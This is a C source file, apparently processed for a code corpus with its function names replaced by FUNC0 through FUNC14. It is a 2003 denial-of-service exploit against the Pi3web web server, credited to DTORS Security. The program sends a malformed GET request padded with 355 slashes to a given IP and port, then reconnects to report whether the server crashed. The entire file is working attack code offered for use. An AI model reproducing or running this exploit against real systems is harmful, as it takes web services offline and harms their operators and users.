#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  server ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC0 (struct sockaddr_in*,int,long) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (int) ; 
 int FUNC10 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int /*<<< orphan*/ ) ; 

int FUNC14(int argc, char **argv)
{
  int i, port, sd, rc;
  char buffer[355];
  char *get = "GET";
  char packet[360];
  struct sockaddr_in server;

  if(argc > 3 || argc < 2)
  {
    FUNC8("USAGE: %s IP PORT\n", argv[0]);
    FUNC8("e.g. ./pi3web-DoS 127.0.0.1 80\n");
    FUNC5(0);
  }
  if(argc == 2) port = 80;
  else port = FUNC2(argv[2]);

  for(i = 0; i < 355; i++) buffer[i] = '/'; //Build the malformed request
  FUNC11(packet, "%s %s\n", get, buffer);
  FUNC0(&server, port, (long)FUNC6(argv[1]));

  sd = FUNC10(AF_INET, SOCK_STREAM, 0);
  if(sd < 0) FUNC7("Socket");
  FUNC1(sd >= 0);
  rc = FUNC4(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0) FUNC7("Connect");
  FUNC1(rc == 0);
  FUNC8("\n\t\t(c) 2003 DTORS Security\n");
  FUNC8("\t\tUnix Version DoS for Pi3web\n");
  FUNC8("\t\tby Angelo Rosiello\n\n");
  FUNC13(sd, packet, FUNC12(packet)); //Caput!
  FUNC8("Malformed packet sent!\n");
  FUNC3(sd);

  FUNC8("Checking if the server crashed...\n");
  FUNC9(3);

  sd = FUNC10(AF_INET, SOCK_STREAM, 0);
        if(sd < 0) FUNC7("Socket");
  FUNC1(sd >= 0);
  rc = FUNC4(sd, (struct sockaddr *) &server, sizeof(server));
  if(rc != 0)
  {
    FUNC8("The server is dead!\n");
    FUNC5(0);
  }
  else if(rc == 0) FUNC8("The server is not vulnerable!\n");
  FUNC3(sd);
  FUNC5(0);
}